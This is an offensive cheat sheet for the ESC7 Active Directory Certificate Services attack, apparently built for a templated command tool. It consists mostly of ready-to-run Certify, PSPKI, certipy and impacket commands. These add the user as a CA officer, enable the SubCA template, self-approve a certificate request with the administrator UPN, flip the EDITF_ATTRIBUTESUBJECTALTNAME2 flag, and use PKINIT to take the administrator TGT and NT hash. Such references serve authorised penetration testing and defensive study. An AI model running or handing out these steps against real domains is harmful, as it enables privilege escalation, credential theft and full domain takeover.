---
technique: ESC7 - Certificate Authority Rights Abuse
category: adcs
targets: Certificate Authority, Certificate Templates, Domain Principals
protocols: LDAP, RPC, HTTP, Kerberos
remote_capable: true
tags: adcs esc esc7 certificate-services pkinit
---

# ESC7 - Certificate Authority Rights Abuse

ESC7 abuses ManageCA or ManageCertificates rights to change CA behavior, approve pending requests, or issue certificates.

## Windows

### Certify: enumerate CAs for ESC7 (ESC7)

#powershell #certify #enum #manage-ca

Enumerate CAs to identify ManageCA or ManageCertificates rights on a controlled principal.

```powershell title:"ESC7: enumerate CAs to find ManageCA rights with Certify"
.\Certify.exe cas
```
<!-- cheat
import domain_ip
import users
-->

### PSPKI: Step 1: install PSPKI (ESC7)

#powershell #pspki #manage-ca #manage-certificates

Install the PSPKI module for CA officer operations.

```powershell title:"ESC7: install PSPKI"
Install-Module -Name PSPKI
```
<!-- cheat
import domain_ip
import users
-->

### PSPKI: Step 2: import PSPKI (ESC7)

#powershell #pspki #manage-ca #manage-certificates

Import the PSPKI module for CA officer operations.

```powershell title:"ESC7: import PSPKI"
Import-Module PSPKI
```
<!-- cheat
import domain_ip
import users
-->

### PSPKI: Step 3: approve pending cert request (ESC7)

#powershell #pspki #manage-certificates

Approve the pending certificate request as a CA officer to bypass manager approval.

```powershell title:"ESC7: approve pending cert request as CA officer"
Get-CertificationAuthority -ComputerName "$ca_fqdn" | Get-PendingRequest -RequestID $request_id | Approve-CertificateRequest
```
<!-- cheat
import domain_ip
import users
var ca_fqdn
var request_id
-->

### Certify: Step 3: download issued cert (ESC7)

#powershell #certify #manage-certificates

Download the issued certificate using the approved request ID.

```powershell title:"ESC7: download issued cert by request ID"
.\Certify.exe download /ca:"$ca_fqdn\$ca_name" /id:$request_id
```
<!-- cheat
import domain_ip
import users
var ca_fqdn
var ca_name
var request_id
-->

### PSPKI: Step 3: create CA config reader (ESC7)

#powershell #pspki #manage-ca #rsat

Create a CA registry manager object for reading policy module values over DCOM.

```powershell title:"ESC7: create CA config reader"
$configReader = New-Object SysadminsLV.PKI.Dcom.Implementations.CertSrvRegManagerD "$ca_fqdn"
```
<!-- cheat
import domain_ip
import users
var ca_fqdn
-->

### PSPKI: Step 4: set CA config root (ESC7)

#powershell #pspki #manage-ca #rsat

Set the config reader to the CA root node before reading policy module values.

```powershell title:"ESC7: set CA config root node"
$configReader.SetRootNode($true)
```
<!-- cheat
-->

### PSPKI: Step 5: read EDITF flags (ESC7)

#powershell #pspki #manage-ca #rsat

Read the current EditFlags value from the CA policy module registry via DCOM.

```powershell title:"ESC7: read current EditFlags from CA policy module"
$configReader.GetConfigEntry("EditFlags", "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy")
```
<!-- cheat
-->

### PSPKI: Step 6: set EDITF_ATTRIBUTESUBJECTALTNAME2 (ESC7)

#powershell #pspki #manage-ca #editf-san

Set the EDITF_ATTRIBUTESUBJECTALTNAME2 bit in CA EditFlags via DCOM; service restart required for the flag to take effect.

```powershell title:"ESC7: set EDITF_ATTRIBUTESUBJECTALTNAME2 via PSPKI DCOM"
$configReader.SetConfigEntry(1376590, "EditFlags", "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy")
```
<!-- cheat
-->

### PSPKI: Step 4: verify EDITF flags via certutil (ESC7)

#powershell #certutil #editf-san

Verify the EditFlags value was applied correctly via certutil.

```powershell title:"ESC7: verify EditFlags value with certutil"
certutil.exe -config "$ca_fqdn\$ca_name" -getreg "policy\EditFlags"
```
<!-- cheat
import domain_ip
import users
var ca_fqdn
var ca_name
-->

### PSPKI: Step 1: submit cert request for approval (ESC7 alternate)

#powershell #certify #manage-certificates #subca

Submit a cert request to a template requiring manager approval to get a pending request ID.

```powershell title:"ESC7: submit cert request to template requiring approval"
.\Certify.exe request /ca:"$ca_fqdn\$ca_name" /template:ApprovalNeeded
```
<!-- cheat
import domain_ip
import users
var ca_fqdn
var ca_name
-->

## Linux

### ESC7: Step 1: add self as CA officer (certipy)

#certipy #manage-ca #subca

Grant self ManageCertificates (officer) role on the CA.

```sh title:"ESC7: add self as officer on the CA"
certipy ca -u $user@$domain $auth_flags -dc-ip $rhost_ip -target $ca_fqdn -ca $ca_name -add-officer $user
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var ca_fqdn
var ca_name
-->

### ESC7: Step 2: enable SubCA template (certipy)

#certipy #manage-ca #subca

Enable the SubCA template so a request with admin UPN can be submitted.

```sh title:"ESC7: enable SubCA template on the CA"
certipy ca -u $user@$domain $auth_flags -dc-ip $rhost_ip -target $ca_fqdn -ca $ca_name -enable-template SubCA
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var ca_fqdn
var ca_name
-->

### ESC7: Step 3: submit pending request (certipy)

#certipy #manage-ca #subca

Submit a cert request with admin UPN against SubCA; it will pend or fail and return a request ID.

```sh title:"ESC7: submit SubCA request with admin UPN (will pend)"
certipy req -u $user@$domain $auth_flags -dc-ip $rhost_ip -target $ca_fqdn -ca $ca_name -template SubCA -upn administrator@$domain
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var ca_fqdn
var ca_name
-->

### ESC7: Step 4: approve pending request (certipy)

#certipy #manage-certificates #subca

Approve the pending request as CA officer to issue the certificate.

```sh title:"ESC7: approve own pending request as CA officer"
certipy ca -u $user@$domain $auth_flags -dc-ip $rhost_ip -target $ca_fqdn -ca $ca_name -issue-request $request_id
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var ca_fqdn
var ca_name
var request_id
-->

### ESC7: Step 5: retrieve issued cert (certipy)

#certipy #manage-ca #subca

Retrieve the now-issued certificate using the request ID.

```sh title:"ESC7: retrieve issued cert by request ID"
certipy req -u $user@$domain $auth_flags -dc-ip $rhost_ip -target $ca_fqdn -ca $ca_name -retrieve $request_id
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var ca_fqdn
var ca_name
var request_id
-->

### ESC7: Step 6: PKINIT as administrator (certipy)

#certipy #pkinit

Authenticate with PKINIT using the retrieved cert to get the administrator TGT and NT hash.

```sh title:"ESC7: PKINIT with retrieved administrator cert"
certipy auth -pfx administrator.pfx -username administrator@$domain -dc-ip $rhost_ip
```
<!-- cheat
import domain_ip
import certipy_auth
-->

### reg.py: Step 1: query current EDITF value (ESC7)

#impacket #registry #editf-san

Query the current EDITF_ATTRIBUTESUBJECTALTNAME2 registry flag on the CA via remote registry.

```sh title:"ESC7: query current editflags value via remote registry"
reg.py "$domain"/"$user":"$pass"@"$ca_ip" query -keyName 'HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\$ca_name\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy' -v editflags
```
<!-- cheat
import domain_ip
import users
import passwords
var ca_ip
var ca_name
-->

### reg.py: Step 2: set EDITF_ATTRIBUTESUBJECTALTNAME2 (ESC7)

#impacket #registry #editf-san

Write the new EditFlags value to enable EDITF_ATTRIBUTESUBJECTALTNAME2 via remote registry; service restart needed.

```sh title:"ESC7: write new editflags value to enable EDITF_ATTRIBUTESUBJECTALTNAME2"
reg.py "$domain"/"$user":"$pass"@"$ca_ip" add -keyName 'HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\$ca_name\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy' -v editflags -vd $new_editflags_value
```
<!-- cheat
import domain_ip
import users
import passwords
var ca_ip
var ca_name
var new_editflags_value
-->
